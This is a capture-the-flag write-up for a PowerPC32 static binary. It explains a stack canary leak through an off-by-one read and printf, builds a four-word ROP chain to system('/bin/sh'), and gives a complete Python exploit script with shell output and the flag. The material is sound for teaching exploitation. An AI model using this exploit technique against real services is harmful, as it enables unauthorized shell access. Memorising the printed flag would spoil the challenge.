---
title: "PWN#Delta"
category: "Pwn"
tags: ["powerpc", "big-endian", "stack-canary", "canary-leak", "rop", "ret2system", "static-binary"]
solve_date: "2026-10-14T17:00:00+07:00"
language: "en"
points: 54
---

# PWN#Delta — PowerPC32 canary leak and a four-word ROP chain

**Flag:** `CTF{c9a9816576849a4aae690a65c1fba37d}`  
**Service:** `nc 169.58.126.107 5011`  
**Flag format:** `CTF{}`

| Artifact | Bytes | SHA-256 |
|---|---:|---|
| `vault` (ELF32 BE PowerPC, static, not stripped) | 718,920 | — |

No SHA-256 was recorded during the session; the only digest captured is the linker BuildID,
`sha1:ded868c5bd72ab766419da8c57e3e9c9e30bc0e2`. The copy the service runs from `/challenge` is the
same 718,920 bytes.

## Challenge

> PWN#Delta — 54 points. Get a shell on the remote host and read the flag.

The handout is `vault`, a 32-bit **big-endian PowerPC** ELF linked statically against glibc and built
with `GCC: (Debian 15.3.0-4) 15.3.0`. The service prints `=== Vault Terminal ===`, asks for a name,
greets it with `printf("Hello, %s\n", buf)`, asks for a message, prints `Message received.`, and then
loops back to the greeting forever.

The binary is not stripped, so `main`, `setup` and `vuln` are all named in `.symtab`. The remote
process runs as `nobody` with cwd `/challenge`; the flag is `/flag/flag.txt`.

## Analysis

### Build and protections

```text
ELF Header:
  Class:                             ELF32
  Data:                              2's complement, big endian
  Type:                              EXEC (Executable file)
  Machine:                           PowerPC
  Entry point address:               0x10000488
```

* **Non-PIE**: `ET_EXEC` with the first `LOAD` at `0x10000000`, so every address below is absolute.
* **NX**: `GNU_STACK` is `RW`, so the stack is not executable and a ROP chain is required.
* **Static**: `readelf -r` reports `There are no relocations in this file` — glibc is linked in.
* **Stack canary**: the prologues load `__stack_chk_guard` from `-0x7008(r2)`, and a failed check
  calls `__stack_chk_fail_local` at `0x1001ef40`.
* **Full symbol table**: 1796 symbols, including `system` at `0x100020d0`, `read` at `0x1001cb10`,
  `puts` at `0x100084a0` and `printf` at `0x10002130`.

| Symbol | Address | Note |
|---|---|---|
| `main` | `0x10000a80` | prints the banner, calls `vuln` in a loop |
| `setup` | `0x100005d4` | three `setvbuf` calls |
| `vuln` | `0x100008f0` | the state machine with the overflow |
| `debug_dump` | `0x10000694` | dead code: `strncpy` + `printf(buf)` |
| `stash_record` | `0x10000730` | dead code: `memcpy` + `puts` |
| `gadget_load_r9` | `0x100007cc` | dead code, used as a gadget |
| `gadget_vec_r3` | `0x10000834` | dead code, used as a gadget |

The host toolchain could not disassemble the file — Strawberry Perl's `objdump` answers
`can't disassemble for architecture UNKNOWN!` — so every listing below was produced with Capstone
5.0.7 (`CS_ARCH_PPC`, `CS_MODE_BIG_ENDIAN | CS_MODE_32`) over the executable segment, 159,656
instructions in total.

### main

```text
0x10000a80  stwu     r1, -0x30(r1)
0x10000a84  mflr     r0
0x10000a88  stw      r0, 0x34(r1)
0x10000a94  mr       r31, r1
0x10000ab4  bl       0x100005d4        ; setup
0x10000ab8  lwz      r3, -0x7fe4(r30)
0x10000abc  bl       0x100084a0        ; puts("=== Vault Terminal ===")
0x10000ac0  bl       0x100008f0        ; vuln
0x10000ac4  b        0x10000ac0
```

`vuln` is called in an endless loop, so the exploit only needs to break out of one frame.

### The vulnerable function

`vuln` is a small state machine driven by a counter at `0x18(r31)`. Its frame is `0x70` bytes and the
input buffer sits at `r31+0x1c`:

```text
0x100008f0  stwu     r1, -0x70(r1)
0x100008f4  mflr     r0
0x100008f8  stw      r0, 0x74(r1)      ; saved LR  -> buf+88
0x100008fc  stw      r30, 0x68(r1)     ; saved r30 -> buf+76
0x10000900  stw      r31, 0x6c(r1)     ; saved r31 -> buf+80
0x10000904  mr       r31, r1
0x10000918  lwz      r9, -0x7008(r2)   ; __stack_chk_guard
0x1000091c  stw      r9, 0x5c(r31)     ; canary    -> buf+64
```

State `0` prints `Enter your name: ` and moves to state `5`, which reads **65 bytes** into the buffer:

```text
0x100009c0  addi     r9, r31, 0x1c     ; buf
0x100009c4  li       r5, 0x41           ; 65
0x100009cc  li       r3, 0
0x100009d0  bl       0x1001cb10        ; read(0, buf, 0x41)
```

State `6` greets the buffer with `printf("Hello, %s\n", buf)`; state `7` prompts and reads again, this
time **108 bytes** into the *same* buffer (`read(0, buf, 0x6c)`), state `8` prints `Message received.`,
state `9` returns. The second read is 20 bytes longer than the distance to the saved link register, so
the return address is fully attacker-controlled — once the canary is known.

| Offset from `buf` | Contents |
|---:|---|
| `0` | start of the input buffer |
| `64` | stack canary |
| `76` | saved `r30` |
| `80` | saved `r31` |
| `88` | saved LR (the return address) |

### Leaking the canary

The 65-byte name read ends exactly one byte past the buffer, and on this glibc the canary's
lowest-addressed byte is `0x00`. Sending 64 filler bytes plus one marker byte overwrites that zero
terminator, so the following `printf("Hello, %s\n", ...)` keeps printing through the remaining three
canary bytes until it meets the next NUL. Observed on the wire:

```text
2: b'Enter your name: Hello, NNNN…NNNNAgK\xee@\x80\rD\nLeave a message for the vault keeper: '
```

(64 `N`s abbreviated.) The four bytes after the marker are the canary, with byte 0 forced back to
`0x00`. The script therefore sends `b"N" * 64 + b"A"` and rebuilds `canary = b"\x00" + leaked[:3]`.
Canaries seen across connections: `0008846f`, `00406a67`, `00077d48`, `009a31c7`, `0042f4b4`,
`00c920ca`.

### Reaching the return address

The epilogue restores `r1` from `r31+0x70` before the `blr`, which is the same code the compiler emits
for `debug_dump`'s identical `0x70` frame:

```text
0x10000714  addi     r11, r31, 0x70
0x10000718  lwz      r0, 4(r11)        ; saved LR
0x1000071c  mtlr     r0
0x10000720  lwz      r30, -8(r11)
0x10000724  lwz      r31, -4(r11)
0x10000728  mr       r1, r11
0x1000072c  blr
```

Because `buf = r31+0x1c`, the `blr` leaves `r1 = r31+0x70 = buf+84`. On PowerPC there is no `ret`
opcode: `blr` jumps through LR, which the epilogue just loaded from `buf+88`. Control therefore
arrives at the overwritten return slot with the stack pointer already four bytes *below* it.

### The gadgets

The usual first gadget of a 32-bit chain, `lwz r3, 0(r1)`, does not exist in this binary — a
byte-pattern search for its encoding returns zero hits, and so does `mr r3, r9`. The author instead
left four unused functions in `.text` (`debug_dump`, `stash_record`, `gadget_load_r9`,
`gadget_vec_r3`), and two of them are the chain:

```text
0x100007ec  lwz      r9, 0(r1)         ; POP_R9_RET
0x100007f0  lwz      r0, 4(r1)
0x100007f4  mtlr     r0
0x100007f8  addi     r1, r1, 8
0x100007fc  blr
```

`POP_R9_RET` loads `r9` from the stack, loads the new LR from the next word, and advances `r1` by 8.

`VEC_BODY` is the body of `gadget_vec_r3`, entered at `0x10000854` past its prologue. It splats `r9`
into an AltiVec register (`vperm`/`vsel`, with the control vector living in the zero-filled `.bss`
word at `0x100b0f80`), stores the vector and reloads the first lane as `r3`:

```text
0x1000089c  lis      r4, 0x100b
0x100008a0  addi     r4, r4, 0xf90
0x100008a4  stvx     v7, 0, r4
0x100008a8  lwz      r3, 0(r4)         ; r3 = the pointer we put in r9
0x100008ac  lwz      r0, 0(r1)
0x100008b0  mtlr     r0
0x100008b4  addi     r1, r1, 4
0x100008b8  blr
```

Its net effect is `r3 = r9` followed by a normal return through the next stack word. The pointer it
receives is `0x10074850`, the `/bin/sh` string in `.rodata` — note that `0x10074858` is the *next*
string, `exit 0`, an easy off-by-eight.

## Solution

### 1. Leak the canary

Connect, wait for `Enter your name: `, send 65 bytes, and read up to `Leave a message`. Everything
after the 65-byte prefix in the `Hello, ` blob is the canary tail.

### 2. Lay out the frame

108 bytes are available, 104 are used:

| Offset | Value | Purpose |
|---:|---|---|
| `0`–`63` | `M` × 64 | filler |
| `64` | leaked canary | passes the `xor.` check |
| `76` | `0x100b698c` | restored `r30` (unused by the chain) |
| `80` | `0` | restored `r31` (unused by the chain) |
| `84` | `0` | padding: consumed by the first `lwz r9` |
| `88` | `0x100007ec` | saved LR → `POP_R9_RET` |
| `92` | `0x10074850` | `"/bin/sh"` |
| `96` | `0x10000854` | `VEC_BODY` |
| `100` | `0x100020d0` | `system` |

### 3. The chain

The first `POP_R9_RET` runs with `r1 = buf+84`, so it loads `r9 = 0` from the padding word and reloads
LR from `buf+88`, which is itself; it then advances `r1` to `buf+92` and branches to the same gadget
again. The second pass does the real work:

```text
[88]  POP_R9_RET   r9 = 0,        LR = [88] = POP_R9_RET, r1 = 92
[88]  POP_R9_RET   r9 = [92] = "/bin/sh", LR = [96] = VEC_BODY, r1 = 100
[96]  VEC_BODY     r3 = r9 = "/bin/sh",  LR = [100] = system,    r1 = 104
[100] system       system("/bin/sh")
```

The self-returning first pass is why the chain still fits in four words: the return slot and the
argument slot overlap the gadget's own two stack reads.

### 4. Interact

`read(0, buf, 0x6c)` returns, the canary compares equal, the epilogue pops the overwritten LR, and
`system("/bin/sh")` runs. The service prints `Message received.` before the shell output, so the
command is sent after draining that acknowledgement.

## Exploit code

```python
"""PWN#Delta (vault) - PPC32 static, canary leak + 4-word ROP -> system("/bin/sh")."""
import struct, time, socket

HOST, PORT = "169.58.126.107", 5011
SH, SYSTEM = 0x10074850, 0x100020d0
POP_R9_RET, VEC_BODY = 0x100007EC, 0x10000854
GOT_R30 = 0x100B698C
CHAIN = [POP_R9_RET, SH, VEC_BODY, SYSTEM]


def u32(x):
    return struct.pack(">I", x & 0xFFFFFFFF)


def until(s, marker, t=6.0):
    s.settimeout(t)
    buf = b""
    end = time.time() + t
    while marker not in buf and time.time() < end:
        try:
            d = s.recv(4096)
        except OSError:
            break
        if not d:
            break
        buf += d
    return buf


def drain(s, t=2.0):
    s.settimeout(t)
    buf = b""
    try:
        while True:
            d = s.recv(4096)
            if not d:
                break
            buf += d
    except OSError:
        pass
    return buf


def main(cmd=b"cat /flag/flag.txt"):
    s = socket.create_connection((HOST, PORT), 12)
    until(s, b"Enter your name: ")
    # stage 1: 64 filler + 1 marker over canary byte0 (always 0x00) -> leaks bytes 1..3
    s.sendall(b"N" * 64 + b"A")
    echo = until(s, b"Leave a message").split(b"Hello, ", 1)[1]
    canary = b"\x00" + (echo[65:].split(b"\nLeave")[0] + b"\x00\x00\x00")[:3]
    # stage 2: 108-byte read overflows LR at buf+88
    payload = (b"M" * 64 + canary + b"\x00" * 8 + u32(GOT_R30) + u32(0) + b"\x00" * 4
               + b"".join(u32(w) for w in CHAIN))
    assert len(payload) <= 0x6c
    s.sendall(payload)
    print("[*] canary      :", canary.hex())
    print("[*] ack         :", drain(s, 0.8))
    s.sendall(cmd + b"\n")
    time.sleep(0.6)
    out = drain(s, 3)
    print("[*] shell output:\n" + out.decode(errors="replace"))
    s.close()
    return out


if __name__ == "__main__":
    main()
```

## Result

A control run with `PUTS` substituted for `SYSTEM` confirms the vector gadget really leaves the string
pointer in `r3` — `puts` prints `/bin/sh`, then the process dies because no function was called:

```text
{'canary': '00406a67', 'ack': b'Message received.\n/bin/sh\n', 'out': b'', 'alive': False}
```

`system("/bin/sh")` with `id` (the repr is wrapped for width):

```text
{'canary': '00077d48', 'ack': b'Message received.\n',
 'out': b'uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)\n', 'alive': True}
```

Filesystem enumeration located the flag (relevant lines of a longer `pwd; ls -la /; find …; id;
uname -a` run, in output order):

```text
/challenge
/flag
/flag/flag.txt
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
Linux fcf1f072366d 6.12.38+deb13-cloud-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.38-1 (2025-07-16) x86_64 GNU/Linux
```

`cat /flag/flag.txt; ls -la /flag /challenge` (the `total` lines and `.`/`..` entries are omitted):

```text
CTF{c9a9816576849a4aae690a65c1fba37d}
/challenge:
-r-xr-xr-x 1 root root 718920 Oct  9 19:46 vault

/flag:
-r--r--r-- 1 root root     38 Oct  9 20:00 flag.txt
```

Re-run of the consolidated script above, from a fresh connection:

```text
[*] canary      : 00c920ca
[*] ack         : b'Message received.\n'
[*] shell output:
CTF{c9a9816576849a4aae690a65c1fba37d}
```

## Notes

* No SHA-256 of the handout was recorded during the session, only the BuildID, so that cell carries a
  dash instead of a guessed digest.
* The kernel in `uname -a` is `x86_64`, so the PowerPC binary is running under `qemu-ppc` user-mode
  emulation inside a Docker container; `system()` and `/bin/sh` behave normally there.
* `/bin/sh` is at `0x10074850`. `0x10074858` is the adjacent `exit 0` string; pointing `r9` there
  gives a shell that exits immediately.
* The whole binary contains **no** `lwz r3, 0(r1)` and no `mr r3, r9`, so the classic pop-into-`r3`
  gadget is unavailable. The two-stage `POP_R9_RET` → `gadget_vec_r3` sequence exists only because
  the author shipped those two dead functions.
* `VEC_BODY` must be entered at `0x10000854`, not at the function start `0x10000834`: the prologue
  would build a new frame and clobber the `r1` the chain depends on.
* The four zero bytes at `buf+84` are padding, not part of the chain. They are what the first
  `lwz r9` consumes, and dropping them shifts every gadget by one word.
* The leak truncates if any of canary bytes 1–3 is `0x00`; the script pads with NULs and would then
  build a wrong canary, so a failed attempt just means reconnecting for a fresh canary.
* `pwntools` was unusable here: its `remote.poll` and `select.POLLIN` do not exist on Windows. The
  final script uses a plain `socket`, which also makes the drain-before-send ordering explicit.
* `Message received.` is printed by `puts` after the second read, before the ROP chain runs; the
  command has to be sent after that acknowledgement, otherwise it is swallowed by the 108-byte read.
